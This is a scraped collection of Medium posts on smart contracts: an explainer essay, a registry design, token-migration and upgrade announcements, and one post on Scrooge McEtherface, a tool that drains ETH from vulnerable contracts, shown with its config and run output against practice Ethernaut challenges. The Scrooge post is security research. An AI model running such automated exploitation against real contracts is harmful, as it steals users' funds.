mean that the clerk could in theory just give you a random piece of paper with no significance and call it a ticket. As a customer you won\u2019t know the difference. The clerk could also give you an authentic ticket but it could be a duplicate of one that has already been sold. Or they could give you a \u201creal\u201d ticket, but simply deny you entry to the movie theatre when you later arrive to watch the movie.It probably seems utterly ridiculous that I am even discussing this with you, since we take these things for granted.But it is precisely because we take all these details for granted that, we fail to comprehend how electronic versions of the same things work. We have simply never considered the minutiae of all the steps and trust involved in regular interaction and exchanges of goods, service sand money.These interactions run smoothly in real life, because people have a great deal of trust between each other and in particular towards larger establishments such as a movie theatre. We assume that they will not renegade on the promise they give you buy selling you a ticket because it will become public knowledge that they cheat their customers. Thus their reputation is ruined and they don\u2019t get more customers. Hence you know they have no incentive to cheat you and give you fake ticket.Hence the purpose of the ticket isn\u2019t for the customer to trust that they get something back, but so that we can prove to the movie theatre that we have paid for access to one of their movies. In other words trust only goes one way. We trust them but they don\u2019t trust us. Again, lets ask the obvious. Why is that?Our identity is not widely known to the extent that the movie theatre is. When we visit a theatre their identity is abundantly clear. However the identity of the customer is not obvious to the movie theatre. If we cheat them, they have no easy way of naming and shaming us.Online ticketsThis is why online ticket sales is fairly easy to accomplish. Since it is more important that the movie theatre verifies that we have paid them, an online solution really just requires payment to be verified, before letting us download a ticket. Theoretically it is easy for them to just return a bogus ticket or no ticket at all.However we can trust that the movie theatre doesn\u2019t do this, because we know it is not their incentive to do so. Although even this point is more complicated than it looks at first glance when being online.You have to be able to trust that the web page you visit and pay money to, is actually the webpage of the movie theatre. In other words we have to be able to verify the identity of the webpage. That is a solved problem.Webpages will usually employ certificates for any kind of operation requiring security such as login and payment. A certificate is digitally signed by somebody else to prove that the web page is owned and run by the one they say they are. Of course we need to be able to trust certificate the signer for this to work. If you are on a Mac you essentially have to trust that Apple picked a certificate signer they trust. So in a sense we create a long list of trust, verified with digital signatures. As long as you trust Apple, you can in other words trust that the movie theatre web page belongs to the company they say it belongs to.So far so good, but what has this to do with smart contracts you might ask?The point I am going to make is that smart contracts is not relevant between entities which already trust each other, or as in this case, trust only needs to go one way. Smart contracts is to facilitate chains of trust.This happens the moment I buy a movie ticket and try to sell it to a stranger. If I have downloaded the ticket online, then essentially the ticket is just a number. Usually that number is displayed as a QR code for easy scanning, but that is just an implementation detail.If I was to sell this ticket to a stranger, we get two problems:Since I am not a public figure, how can the buyer trust me that the number I am selling is actually a valid number and not a number I just made up?Even if it is a valid number, how can the buyer be certain I haven\u2019t sold that number to somebody else already? Essentially how do we solve the double spending problem?This is the kind of problem we can solve with a smart contract. We can write a contract in the form of code which executes a transaction under given circumstances.For movie tickets we want a transaction which is only valid when signed by both buyer and seller. The transaction should transfer crypto currency from buyer to seller and transfer a token representing the ticket from seller to buyer.How is Ownership Transferred in a Smart Contract?What transfer means in this context might not be obvious unless you understand crypto currencies well. I\u2019ll try to explain with an analogy.Imagine that every transaction is a piece of paper which is identified with a number and which says the people money is going to. Each transaction can only spend money which was transferred by a previous transaction to the signer of this transaction.Hence we get a stack of transactions depending on each other. What we call the miners can verify this stack of transactions and making sure that a transaction isn\u2019t spending money that was never transferred to the person signing the transaction.So basically we are dealing with a chain of signatures, which must be possible to verify.So we have chains of transactions, which are such that we need to be able to verify the whole chain of transactions changing ownership of money all the way from the buyer to the seller. Likewise a similar chain of signatures must exist, describing a transfer of ownership of movie tickets. This chain has to terminate at the movie theatre.The buyer needs to be able to verify that the movie theatre did in fact issue the ticket. The buyer then only needs to be able to trust that the movie theatre will honor the ticket when it is presented at the movie theatre.How does the Movie Theatre Verify the\u00a0Ticket?If tickets can be resold online, we get the challenge that the movie theatre also need to make sure that only the last person buying the ticket is able to use it.Hence we can\u2019t rally pass around a number, since anybody could make a copy of that number and show it at the theatre.The theatre could maintain a copy of the blockchain and use it to present a challenge to the moviegoer. The moviegoer could present his or her public key as e.g. a QR code and the movie theatre could scan this code and use it to encrypt a random number, displayed as a QR code which the moviegoer has to scan and decrypt with his or her corresponding private key, then show the original random number.This is just an example. You could probably do this in many different ways. But it is just to illustrate that there is a way to prove that you have paid for a ticket and the movie theatre having access to the blockchain can verify that nobody else owns this ticket now.Buying and Selling\u00a0PropertyMy initial thoughts when first reading about smart contracts, was centered on buying and selling a house. When the article casually claimed no people were needed to be involved because the code would just make sure the contract was carried out, then I was immediately skeptical of these claims.Sure block chain technology can make sure money is transferred, but the code can\u2019t see that you got the house you wanted. Nor can the code hold a gun to your head and force you to carry out your part of the contract, such as handing over a house to the buyer.Obviously people need to be involved somehow. So what role exactly does a smart contract play and what sort of people can we exclude, and who do we need to keep around?It is easy to take the process of handing over property and owning a house for granted when like me, you live in a country with high levels of trust and long democratic traditions. I never really put much thought into how you prove that you own a property, until a friend of mine from a former east block country told me a story about how they had lost ownership of their house.Somebody has simply taken over the house. I had not believed this was even possible. In reality it is simple enough if you live in a corrupt country. The ownership history of a house or rather a property is registered in some government registry, along with a paper trail.The thief in this case simply bribed a government official to change the registry so it looked as if the property belonged to him. Then he could call upon the authorities to evict my friend\u2019s family and label them as squatters.With smart contracts and the block chain you can prevent this from happening.In this case as in almost all transfer of ownership of major assets, there is a middleman or third party which has to facilitate the transfer. E.g. in this case a government registry which both seller and buyer has to trust will record the transfer.As with the movie ticket example, what is of interest to smart contracts is really the whole chain of transfers. I can\u2019t simply write a code representing a contract to sell my house and hand it over to the buyer for digital signing. Why?Because anybody could make a contract and say it is for a house. You might not even own that house. Hence a contract has to provide some unbroken chain of ownership transfers back to some entity everybody can trust. In our previous example that was the movie theatre.For property that could be a government body which issues the original property. If you trust the government and the seller can prove an unbroken chain of ownership transfers with digital signatures back to the government body on a sort of blockchain, then we know that the seller is entitled to sell this property and we may buy it safely.This means citizens can\u2019t arbitrarily start making contracts on say Ethereum to buy and sell property today. You need to make arrangements with government first where they agree to create some sort of digital tokens to represent property, so that they can verify with anybody who asks, that this is in fact an actual property originally acknowledged and recognized by the government.Alternative a company with a lot of visibility and which people trust could serve a similar function.Back to my example with my friend who\u2019s family lost their house. How would a smart contract on the blockchain help? With blockchains you can\u2019t easily tamper with the history, nor can you transfer ownership without knowing the private key of the current owner.A single corrupt government official could hence not alter the records.Buying and Selling Items\u00a0OnlineIf I buy a camera online, smart contract can\u2019t of course force the seller to deliver the camera to me upon receiving my payment.However a buyer and seller can enter an escrow style agreement. What I mean by that is that the buyer can agree through a smart contract to freeze some of their crypto currency. Basically they can make a payment to the seller, but the seller can\u2019t spend the money without getting a signature from the buyer. The buyer would then only provide that signature as soon as they have received the desired product.If the buyer receives the camera, he or she does not have an incentive to not sign, because they can\u2019t get hold of the money anyway. The only thing not signing achieves is ruining their reputation.But perhaps a better method is if created products are tokenized from the point they leave the factory. One registers unique serial number, model number etc of the camera from when it leaves the factory. If every sale of the camera is done over the blockchain using smart contracts then the history of the camera will be recorded there.What is the benefit of this approach? Well, now the most recent owner of the camera has an easy way of proving that they own the camera, and can hence use factory warranty. Another benefit is that one can imagine that each seller in the transaction adds faults, defects or repairs done on the camera. Seller and buyer could have agreed on this upfront and buyer can verify that the seller did in fact add the faults and repairs, they had agreed upon. This could be the result of e.g. buyer inspecting the product and finding faults.But perhaps much better would be that anyone performing repairs have to register the repair of any product they repair. Companies might require this make refunds e.g. The benefits of this is that it makes it hard for any seller to hide past history about a product to a new perspective buyer.Supply ChainsWhen goods are transported from say a farm, mine or factory all the way to the consumer, it has to go through a lot of different steps. Not just loading and unloading onto different transport vehicles but we also have to deal with customs declarations, export controls and so on.A common challenge is to track a product, so that various parties involved in the supply chain can keep track of where the product is and what state it is in.A simple solution to this is to do what we normally do when we need one shared version of events. We create one central database managed by a party which is trusted by everyone participating. Everybody then reports to this party, which updates the database and answers queries from participants in the supply chain about the current status of the transported good.Sometimes that works, but what happens when you got multiple parties who don\u2019t trust one party enough to maintain the shared information?This happens when your got a lot of parties involved any nobody is dominant. It is a problem which also arises when national authorities are involved.They naturally don\u2019t want status information about whether a product has passed customs declaration to be controlled by a database run by a company. Nor does different countries involved in the transport let another one maintain status about them. Government doesn\u2019t want to let a company be able to change the customs declaration status of a product in their database.So basically we end up with every party in the supply chain, companies and governments maintaining separate databases with parts of the total information about a product. This data will be partly synchronized, but there is no clear authority on what is the correct version of any info.With blockchains and smart contracts, the database may only be changed through a smart contract. The smart contract is the gatekeeper to the database. That means e.g. the government can feel confident that a company doesn\u2019t change data about custom declarations, as a smart contract accessing that kind of information would require a signature which only a government representative could produce.Likewise a company knows that another company can\u2019t alter state related to the operations they perform as that information can only be altered with their signature.And all participants can feel confident that there is a \u201cpaper-trail,\u201d over all changes and events which has happened which can\u2019t be retroactively modified.ConclusionWhile smart contracts have a lot of potential, we can just start using them willy nilly for anything until agreements have been made with governments, companies etc to tokenize or in some form represent physical assets so they can be traded and the buyer can trace their purchase back to some legal entity, whether the government or a company which they can trust.The key thing to observe here is that traditionally, every modification to a chain of ownership has to be done by some kind of trusted third party. This involved government, lawyers etc who usually charge big fees to make such a change.With smart contracts we only need to secure the beginning of the chain to the real world. All ownership transactions after that, can be done entirely electronic. Or rather the work usually done by the trusted third party can be done electronically. People still need to interact with the physical world and verify things before they sign off.", "responses": "5"}, {"title": "Automated Smart Contract Exploitation and\u00a0Looting", "author_name": "Bernhard Mueller", "link": "https://blog.goodaudience.com/automating-smart-contract-exploitation-and-looting-d43e9740b41c?source=search_post", "post_date": "Nov 30, 2018", "readtime": "5 min read", "upvotes": "417", "content": "Automated Smart Contract Exploitation and\u00a0LootingBernhard MuellerBlockedUnblockFollowFollowingNov 30, 2018In my previous article I showed that Mythril Classic can discover non-trivial vulnerabilities in Ethereum smart contracts and compute the transaction(s) needed to exploit them. The obvious next step: Why not build an all-in-one tool that automates the whole process? Enter Scrooge McEtherface, a proof-of-concept I hacked together over the past few days. Scrooge uses Mythril\u2019s Ether Thief and Suicide modules to automatically extract ETH from vulnerable smart contracts.Scrooge turned out to be pretty easy to write\u200a\u2014\u200ait\u2019s less than 200 lines of code and as you can see on the screenshot, 95% of the engineering effort went into improving the graphics. I also tested it on a couple of Ethernaut challenges. Here\u2019s the rundown.FalloutThe first challenge contains the classical misnamed constructor flaw: Anyone can become the owner by calling Fal1Out(). We know that Mythril detects this with default settings so it should be an easy win.Scrooge has a configuration file that contains a few basic options. Unless you have a fully synced Ropsten node, the easiest way to reproduce this is firing up Ganache and deploying the contract locally using Remix.In my own experiment I edited the settings in Scrooge\u2019s config.ini to point to Ganache RPC and use a pre-generated Ganache test account (different from the contract creator) to send transactions from.[settings]rpc = https://localhost:8545sender = 0x56c3a80CCC712Dbf38177fdfEbD8436F8833c4A9symbolic_tx_count = 2Scrooge is now locked-and-loaded. In fact, it\u2019s so script-kiddy friendly that it doesn\u2019t accept any command line arguments besides the target address. Here is the output from running Scrooge against the Fallout contract:$ ./scrooge 0x27d390aa4a929012b58ed6662f2dcf8e6a7f8291Scrooge McEtherface at your service.Exploring 0x27d390aA4a929012b58Ed6662F2dcf8E6a7F8291 over 2 symbolic transactions.Your initial account balance is 100.00000 ETH.Charging lasers...Looks like anyone can withdraw ETH from this contract.You are about to send the following transaction:From: 0x56c3a80CCC712Dbf38177fdfEbD8436F8833c4A9, To: 0x27d390aA4a929012b58Ed6662F2dcf8E6a7F8291, Value: 0Data: 0x6fab5ddfAre you sure you want to proceed (y/N)?Transaction sent successfully, tx-hash: 0x619d4b4ba80a9cddabab0044dee857ae7e60b53c97bc9fb674227f579dd17cc2. Waiting for transaction to be mined...You are about to send the following transaction:From: 0x56c3a80CCC712Dbf38177fdfEbD8436F8833c4A9, To: 0x27d390aA4a929012b58Ed6662F2dcf8E6a7F8291, Value: 0Data: 0x8aa96f38Are you sure you want to proceed (y/N)?Transaction sent successfully, tx-hash: 0x59dd01aae6b8c150f4593fdfbf23c62d80605ccd3a3d7f61500ac0018bbdee61. Waiting for transaction to be mined...Snagged 4.99988 ETH. Your final account balance is 104.99988 ETH.Looks like it worked! We lost a few Wei to transaction fees but the rest ended up in the our account.FallbackIn Fallback, the goal is to send a specific sequence of transactions to become the contract owner. The challenge is easy for a human attacker, but not that trivial to solve for an automated analyzer.First of all, it requires three transactions to be sent in the correct order. As i wrote in my previous article, Mythril can explore program states over an arbitrary number of transactions, but the cost of analysis increases exponentially with the number of transactions.A successful attack also requires sending small amounts of ETH with the initial two the transactions. Those amounts need to be adjusted such that the attack is profitable. Optimally, they\u2019d also be optimized to maximize profits.Scrooge doesn\u2019t do any of those optimizations (don\u2019t complain, it was a weekend project and PRs are of course welcome). You can however increase the amount of transactions it explores in config.ini. For Fallback this variable needs to be set to 3:symbolic_tx_count = 3Now we should be ready to pwn a locally deployed Fallback instance with a balance of 5 ETH:$ ./scrooge 0xffee64cf24b12d9b4de460a3ef6d39fedd431d88Scrooge McEtherface at your service.Exploring 0xffEE64Cf24b12D9B4De460a3eF6D39FEdd431d88 over 3 symbolic transactions.Your initial account balance is 109.99975 ETH.Charging lasers...Looks like anyone can withdraw ETH from this contract.You are about to send the following transaction:WARNING: You'll be transferring 0.00056 ETH wth this transactionFrom: 0x56c3a80CCC712Dbf38177fdfEbD8436F8833c4A9, To: 0xffEE64Cf24b12D9B4De460a3eF6D39FEdd431d88, Value: 562949953421312Data: 0xd7bb99baAre you sure you want to proceed (y/N)?Transaction sent successfully, tx-hash: 0x0961f1ada3bcd0b3ed1065466a9d6d08d3cbe11bb3de6a3f88e15efa2fb1f3e3. Waiting for transaction to be mined...You are about to send the following transaction:WARNING: You'll be transferring 0.00000 ETH wth this transactionFrom: 0x56c3a80CCC712Dbf38177fdfEbD8436F8833c4A9, To: 0xffEE64Cf24b12D9B4De460a3eF6D39FEdd431d88, Value: 549755813888Data: 0xAre you sure you want to proceed (y/N)?Transaction sent successfully, tx-hash: 0xe715eca2abef303910e950860ea00f0c0b3bd54d40cf1273f1f8eba51aae05c0. Waiting for transaction to be mined...You are about to send the following transaction:From: 0x56c3a80CCC712Dbf38177fdfEbD8436F8833c4A9, To: 0xffEE64Cf24b12D9B4De460a3eF6D39FEdd431d88, Value: 0Data: 0x3ccfd60bAre you sure you want to proceed (y/N)?Transaction sent successfully, tx-hash: 0x366ffbf28dbe258bbf102595de70107c03fc35d69387f6ba2ce71fe866cf3320. Waiting for transaction to be mined...Snagged 4.99980 ETH. Your final account balance is 114.99956 ETH.Looking good! Note that in this case, Scrooge created three transactions and sent small amounts of Wei along with the first two (it could probably have sent just 1 Wei but we\u2019ll take the loss).Wow, isn\u2019t This a Very Dangerous Tool?In March 2018, researchers claimed to have found 34,000 exploitable contracts on the Ethereum mainnet. This claims were widely overblown. It would be naive to believe that Scrooge-like tools (some of them private) aren\u2019t run by bad actors at all times. In fact, finding medium-complexity bugs in older accounts that haven\u2019t been exploited yet is highly unlikely (my guess is that the MAIAN results contained 33,998 false positives, but I\u2019m happy to have a look at the data should it be released).Here are some numbers that are based on my own observations and match the experience of several other researchers working in the field. On average, there\u2019s one or two exploitable contracts deployed on the mainnet per week, but most of them never hold any ETH. If an opportunity opens up, attackers are racing to exploit it (the time window does seems to be open for several hours, so apparently the hackers' toolsets could still benefit from some optimization).Then of course, honeypots can be tailored to specific tools and script kiddies running tools like Scrooge are easy targets. I built in a few checks and warnings, but then again, if you trip into a honeypot you deserve to loose your ETH.TL;DRScrooge McEtherface fully automates attacks on vulnerable smart contracts and extracts the ETH to the attacker\u2019s account. It is based on Mythril Classic and can therefore compute complex attacks that require multiple transactions to be sent with specific inputs. Use it responsibly and hop on our Discord Server for discussion.", "responses": "1"}, {"title": "Creating a Smart Contract\u00a0Registry", "author_name": "Craig Wright (Bitcoin SV is Bitcoin.)", "link": "https://medium.com/@craig_10243/creating-a-smart-contract-registry-26dac7f238f5?source=search_post", "post_date": "Oct 6, 2018", "readtime": "13 min read", "upvotes": "496", "content": "Creating a Smart Contract\u00a0RegistryCraig Wright (Bitcoin SV is Bitcoin.)BlockedUnblockFollowFollowingOct 6, 2018This post is the first in a series to describe a number of important methods that are needed in creating commercially viable contracts in Bitcoin (BCH).We will cover:How a contract, or structured control condition, can be published and certified on the Blockchain in the form of a token;How this token will be able to reference an external repository holding a complete representation of the contract;How a contract can be structured in a manner to support wholly or partly automated enforcement;How interested parties can enquire as to the current state of the contract;How to configure sub-contracts, or sub-conditions, to contracts that can be derived from the parent contract.In addition, this post series describes one option to provide the following:Defining the lifetime for time-bound contractsHow the contract can be automatically closed or rolled over into a new contract;How the contract to be manually closed or fulfilled;The granted patent is available to read; REGISTRY AND AUTOMATED MANAGEMENT METHOD FOR BLOCKCHAIN-ENFORCED SMART CONTRACTS.OverviewOne of the key problems with modern contract management is that it tends to be massively ad-hoc with local stores and copies of contracts that are manually maintained and managed. In addition, contracts written in natural language are open to interpretation which frequently relies on specialist lawyers to unpick and explain.This presents a mechanism to hold a secure, public record of contracts in a manner that allows their validity to be determined and the details released to authorised entities.Key RequirementsThe key requirements include the ability to:Formally define a contract in a manner that can be formally interpreted and implemented by a machine, as well as converted into natural language;Publish a contract to an audience where the details of the contract can be restricted to authorised entities only, but the knowledge of the existence of the contract is publicly available information. In other words, it can be public knowledge that there is a contract between A and B that anyone can verify, but anything other than its existence is restricted to authorised parties (normally A and B only).i.e. encrypted data on the DHTs (e.g. contract definitions etc.)Provide a mechanism that allows contracts to be time-bound (i.e. they expire after a certain time or on a given date); condition bound (i.e. they expire once the deliverable specified within the contract has been fulfilled) or open-ended (i.e. they continue to roll on with a notice period to terminate them).Provide a mechanism to serve notice to terminate that contract in a public fashion. e.g. Using nLockTime + CLTV in a spend transaction to \u2018enact\u2019 the expiration.Provide a mechanism to structure a hierarchy of sub-contracts in a deterministic manner to allow control over different aspects of the contract to be partitioned. For example, on a technology programme, the requirements phase may have a different set of control triggers than the development phase. i.e. chain of hash-linked DHTs.Key BenefitsThe process defined within this paper will drastically simplify the ability of contracting parties to manage and maintain their contracts. More importantly, the ability to publicly specify control conditions and triggers means that it is materially simpler\u200a\u2014\u200ain the event of a dispute\u200a\u2014\u200ato agree the state of the contract.DHTs are used with Bitcoin to automate many aspects of the contract\u00a0processTechnical SpecificationA smart contract enables contract conditions to be either wholly or to a significant degree automatically enforced. A smart contract built into the Blockchain can be enforced through logic built directly into the bitcoin transaction (i.e. within the locking/unlocking scripts) and/or through external agents (\u2018oracles\u2019 or \u2018bots\u2019). In addition, some contractual conditions can be enforced through other bitcoin transaction elements such as the nLockTime field. For example, in this document we describe an embodiment where the contract remains in effect for as long as there is a valid unspent transaction output representing the contract. It will be appreciated that this condition can be enforced by other mechanism described herein, based on the stipulations in the contract itself (e.g. via an oracle).However, using this simple principle in addition to other features of white papers allows complex scenarios and activities to occur. Effectively, the context around that unsigned transaction output, and the associated metadata within the redeem script that allows it to be spent, allows it to act as a pointer or reference to an off-chain repository of the formal details of the contract.Using standard Bitcoin features such as CheckLockTimeVerify allows the contract to have a formal expiry at a point in the future that is a matter of secure public record; the same construct plus the deterministic sub-key model detailed in the granted patent \u201cDetermining a common secret for the secure exchange of information and hierarchical, deterministic cryptographic keys\u201d would allow the same CLTV model to automatically roll-on the contract unless explicitly cancelled.Again, using one of the many tokenisation mechanisms available for Bitcoin Cash that we shall cover in a set of followup posts would allow this smart contract to reference the repository where the full details of the contract are held. Using the deterministic sub-key model plus the tokenisation mechanism allows sub-contracts or schedules against contracts to be created. Using a suite of external oracles, as we shall demonstrate in after this and the tokenisation posts have been listed, allows contract conditionality to be built in and modified by trusted third-parties.Key TermsThis technical specification uses the following terms throughout to define key concepts and components.Contract ModelFull details of the model are developed in an extensible model. The basic elements of the model are as follows:A codification scheme that allows a complete description of any type of contract. The scheme may be a new construct or may use an existing facility such as XBRL, XML, JSON (etc.);A DFA (Deterministic Finite Automaton) to implement the Contract that can be fully defined within the codification scheme. This will be made up of:o A set of parameters, and where to source those parameters;o A set of state definitionso A set of transitions between the states, including the trigger for the transition and the rules followed during the transition.o Rules definition tableDefinitions of the specific parameters for this instance of the Contract;Mechanisms to secure and protect the Contract;A \u2018browser\u2019 to enable the contact to be made human-readable in formal legal language; andA \u2018compiler\u2019 to convert the codification scheme into Oracle code and / or Bitcoin script.Implementing the\u00a0ContractWhen the Contract is registered in a repository, the associated URI and hash can be used in accordance with using metadata within a Blockchain transaction to associate the transaction on the chain with the controlling contract itself.There are a number of different methods as to how the DFA contained within the contract definition is implemented:As a Blockchain transaction (or sequence of transactions). There are a number of separate white papers that cover how to implement various forms of DFA directly within the Bitcoin scripting language;As an Oracle process (or sequence of Oracle processes). We will cover the basic process for defining and running an Oracle to monitor the Blockchain (and other external sources) in later posts.As a set of instructions for a smart Wallet. In this content, a smart wallet is effectively simply a local Oracle process which can handle certain contract conditions (such as assignment of transaction inputs to a Blockchain transaction).Note that a given contract definition can be implemented as a mixture of the above three mechanisms, where each contract state transition is effectively a separate implementation.There are a number of methods of creating the implementation from a contract definition, including hand-crafting the relevant transactions / code.It is possible to define a compiler process that will automatically generate the relevant code outputs from the contract definition itself.It is also important that a human-readable version of the contract can be rendered upon demand, and we have completed research into developing a mechanism to auto-generate a readable document (in a format such as PDF etc.) from the smart contract itself.Publishing the Contract\u2019s ExistenceIn order to publish the existence of a contract (or defined element within a contract) a transaction is published to the Blockchain using a pay-to-script-hash address where the pay-to-script-hash can be readily determined from:The issuer of the contract; andThe metadata of the contract.Whilst this output remains within the UTXO list, this indicates the validity of the contract contained within the metadata itself. As soon as this output is spent, then the contract is considered complete.Sub-contracts / ConditionsA sub-contract is a contract that it directly related to an existing contract. A condition is a clause within an existing contract that must be publicly fulfilled to meet the terms of that contract.Both sub-contracts and conditions are implemented in the same manner as Contracts as an UTXO with a deterministic redeem script address. In both cases, the entity is considered complete when the UTXO is spent (in the case of the condition this indicates that the condition has been satisfied).There are a number of mechanism\u2019s to create the deterministic address for a condition or sub-contract:Using the mechanism defined within the method, \u201cDetermining a common secret for the secure exchange of information and hierarchical, deterministic cryptographic keys\u201d to derive a new public key using seed information;Creating and publishing the sub-contract, with a reference to the master contract, within the repository and using this as the metadata reference; andAdding the condition / sub-contract reference to the metadata of the existing contract.Securing the\u00a0ContractThe formal representation of the Contract can be secured in multiple manners, depending on the formal needs of that specific contract, although in all cases a public record of the existence of the contract will be published on the Blockchain contained within the metadata record (there re multiple ways to develop the specific metadata structure).From this Blockchain record, authorised entities will be able to learn the location of the formal representation, together with the hash to determine that the formal representation has not been modified since the transaction was published.However, it is possible to further secure the formal representation itself through a number of methods:The document repository itself can present access control mechanisms; andThe Contract itself can be secured through standard encryption techniques limiting access to those entities with access to the relevant decryption keys.In many cases, the Contract itself will have partial protection on it. For example, some sections within the file are protected but the overall content is public. For example, the details of how to implement a fixed rate loan are published but the knowledge of who took out the loan, for how much and at what rate is known only to the contracting parties.This partial protection applies to both the encryption of the information within the contract as well as the hash detecting changes to its content. For a number of contracts, the details of the contract can be amended over its life and this should not require the re-issuance of the contract itself. This can be achieved by determining the scope of the hash over a sub-set of the contract. An example where this might be useful is on the implementation of a unit trust. The contract underpinning the unit trust may not change, but beneficiary for the unit can be amended through on-sell of the contract.Terminating the\u00a0ContractAs the Blockchain provides a permanent, unalterable record of transactions, a contract cannot be terminated by simply removing the associated Contract document. This means that the secure contract repository must have the same storage and retention rules as the Blockchain itself which is supported through a number of standard mechanisms.This means that the solution must present a mechanism for detecting the expiry of a contract through the Blockchain record directly.This is handled through the spending of the UTXO that represents the contract.For a number of contract types, the expiry of the contract can be published simultaneously with the publication of the Contract itself. Effectively two transactions are created, one to publish the contract and get the transaction output representing the contract and a second one to spend that output. This second transaction has a CheckLockTimeVerify set on it to spend the output on a given future date (representing the end of the contract).This auto-spending can be extended to support the rolling-on of a contract (for example contracts that automatically extend for a further twelve months if they aren\u2019t cancelled). In this situation, the UTXO is spent sending it to the \u2018new\u2019 rolled-on contract. However, it is possible to cancel the old one by spending the output before the lock time and thus cancelling the whole contract.Use Case\u00a0ModelThe following use case model demonstrates how straight-forward Bitcoin transactions can be used to implement elements of the DFA directly within Bitcoin scripts. More complicated implementations of the DFA or Oracle are covered separately and thorough related research at nChain.Key Use\u00a0CasesCreate the\u00a0ContractDescriptionAs a Contract Issuer I wish to publish a contract onto the Blockchain for public visibility.Primary ActorContract IssuerMain Success\u00a0ScenarioExtensionsThere are two key extensions to this scenario, which are explicitly documented within the subsequent section:150\u200a\u2014\u200aCreate a sub-contract from an existing contract,175\u200a\u2014\u200aRollover an existing contract into a new oneCreate Sub-contractDescriptionAs a Contract Issuer I wish to create a sub-contract from an existing contract.Primary ActorContract IssuerMain Success\u00a0Scenario[1] This example is written assuming that this would be the Contract Issuer\u2019s public key, but in practice there is nothing to prevent this being the derived sub-key (i.e. a sub-contract of a sub-contract).[2] Effectively this is a document that basically says that this sub-contract covers section <a>, <c> and <e> of this other document rather than duplicating the original information.VariationsThere is a single extension to this Use Case where the sub-contract is independently monitored (for example consider a sign-off from a surveyor in the case of a property build contract) and the contract states \u2018subject to sign-off by <x>\u2019. To implement this, step 150.60 is created and circulated to <x> to sign, and the repay script is not time locked but created as a m of n multi-signature element where the required signatory is <x>. (In practice this transaction here is likely to have two outputs; the fee to <x> plus the payment of the UTXO generated in step 150.50).[175] Rollover Existing\u00a0ContractDescriptionAs a Contract Issuer I wish to rollover an existing contract into a new one.Primary ActorContract IssuerMain Success\u00a0Scenario[1] This example is written assuming that this would be the Contract Issuer\u2019s public key, but in practice there is nothing to prevent this being the derived sub-key (i.e. a sub-contract of a sub-contract).[200] Check\u00a0ContractDescriptionAs an Interested Party, I wish to confirm that there is a contract in existence to cover the activity that I am enquiring aboutPrimary ActorInterested partyMain Success\u00a0ScenarioVariantsThe main variable above assumes that the Interested Party is aware of the transaction that governs the contract through some other route (in general that is that they are either the Contract Issuer or the Contract Counter-party.However, any entity that has access to the Contract Document and knowledge of the Contract Issuer will be able to check by:Deriving the redeem script for the UTXO transaction; andScanning the Blockchain to find a UTXO with that matching redeem script hash.[300] Close\u00a0ContractDescriptionAs a Contract Issuer or Contract Counterparty, I wish to close an existing contract.Primary ActorContract Issuer / Contract CounterpartyMain Success\u00a0ScenarioVariantsContract ConditionsThe same mechanism described above can be used to monitor conditions within a given contract such as checkpoints.For example, if a contract is determined to be worth 100 BCH, with 20 BCH to be paid at checkpoint 1 through 5, then the sub-contract model can derive a master contract, plus five sub-contracts. Each of these sub-contracts can be marked as complete using the same, or different, signatories (such as notaries or similar). In this manner, a public record that the conditions attached to the contract have been met can be maintained.Added with an Oracle process (this shall be described more fully in a later post), then this Oracle process can trigger the 20 BCH payments once the contract has been marked as complete.Control ContractsWhilst the above process is modelled on a smart contract, the smart contract doesn\u2019t have to be a contract in the traditional sense of the word. The smart contract itself can simply be a control condition that is publicly fulfilled.This mechanism can then be used to turn any UTXO into a smart contract, such as for digital access. So, assume that a consumer pays a merchant for access to a service for a period of time. If the merchant\u2019s payment address is a smart contract, then the access control mechanism for the service can check that the money has been paid with an Oracle process sweeping the value at the end of the period to the merchant\u2019s primary account.Scenario 1: Public Registry of an AssetScenario 2: Creation and Registry of an AssetScenario 3: Lease ContractScenario 4: Rolling ContractScenario 5: Contract Conditionality", "responses": "1"}, {"title": "IMPORTANT: New Morpheus.Network Token Smart\u00a0Contract", "author_name": "Morpheus.Network", "link": "https://medium.com/morpheus-network/new-morpheus-network-token-smart-contract-91b80dbc7655?source=search_post", "post_date": "Jun 21, 2018", "readtime": "2 min read", "upvotes": "503", "content": "IMPORTANT: New Morpheus.Network Token Smart\u00a0ContractMorpheus.NetworkBlockedUnblockFollowFollowingJun 21, 2018One of the magic pieces of a blockchain is that it is immutable; once a block has been written to a blockchain or once a smart contract has been deployed, it can never be modified or deleted.However, from time to time, smart contracts need to be updated with new code. How can this be done on an immutable blockchain? By deploying a brand new smart contract!A new smart contract is an opportunity to update the code, fix bugs and incorporate new best practices. Morpheus.Network will be taking that action starting today.Why do this now? Yesterday we became aware of a serious issue which could have a negative impact on our tokens and the community. So we\u2019re fixing it now instead of waiting which is the safest option.What does this mean for you? Overall not that much. The process is pretty seamless but it does require some important changes.We are getting a new token name! The old token name is MORPH. The new token name is MRPH.Your old tokens will be exchanged 1 to 1 with the new tokens. If you had 1800 of the old tokens in your wallet, you will receive 1800 of the new tokens.The exchanges need to migrate to the new smart contract. The exchanges will pause trading and will be provided with the new smart contract address. They will then resume trading with the new smart contract address. The pause will start now.Do not attempt to buy or sell MORPH tokens. Trading now may result in loss of tokens, funds and wallets blacklisted.So what do you need to do right now? Absolutely nothing.\u00a0:-) Keep your tokens safe and sound in your ERC20 wallets and you\u2019ll soon have our latest and greatest tokens and be able to trade on exchanges just like before.We will update this post with new information as it becomes available, as well as update our Telegram Community of course. Join us there if you are not a part of the community already!The team is always available to chat! The best way to reach the team with any questions, comments, concerns or feedback is support@morpheus.networkUPDATE: Please see additional posts on Medium for more information: https://medium.com/@themorpheus", "responses": "5"}, {"title": "The First Cardstack Smart Contract\u00a0Upgrade", "author_name": "Cardstack Team", "link": "https://medium.com/cardstack/the-first-cardstack-smart-contract-upgrade-f9f07cf0955a?source=search_post", "post_date": "Jun 25, 2018", "readtime": "5 min read", "upvotes": "846", "content": "The First Cardstack Smart Contract\u00a0UpgradeWhat you should\u00a0knowCardstack TeamBlockedUnblockFollowFollowingJun 25, 2018Cardstack\u2019s Ethereum smart contract has been designed from the bottom up to be extensible and future-proof. Cardstack isn\u2019t just using an off-the-shelf, run-of-the-mill ERC20 contract. Our smart contract is unlike any others in that it can evolve through upgrades.We have now executed our first smart contract upgrade.In this upgrade, we replaced our original \u201cVersion 1\u201d token contract and ledger with a \u201cVersion 2\u201d token contract and ledger. The V2 ledger replicates all token balances from the V1 ledger.SummaryThe V1 token contract and ledger used \u201cdecimal 0.\u201d The V2 token contract and ledger use \u201cdecimal 18.\u201dUsing decimal 18, we sent transactions from the V2 token contract to the V2 